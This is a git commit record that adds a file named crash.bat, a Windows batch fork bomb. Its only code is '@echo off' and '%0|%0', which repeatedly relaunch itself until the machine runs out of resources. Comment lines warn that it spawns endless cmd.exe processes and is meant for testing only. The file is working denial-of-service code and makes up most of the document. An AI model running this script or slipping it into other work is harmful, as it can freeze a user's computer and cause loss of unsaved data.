35ab404636e7411b1ba677860a3e0c1548e1fa91
L1c1d <jesse.jarochovic@gmail.com>
2026-03-03 20:20:30 -0500

    Add files via upload

---
+++ crash.bat
@@ -0,0 +1,8 @@
+::  WARNING: This is a Windows fork bomb.
+::  It will rapidly spawn endless cmd.exe processes.
+::  DO NOT run this on a production device.
+::  DO NOT run this on any device with important data.
+::  For testing only
+
+@echo off
+%0|%0
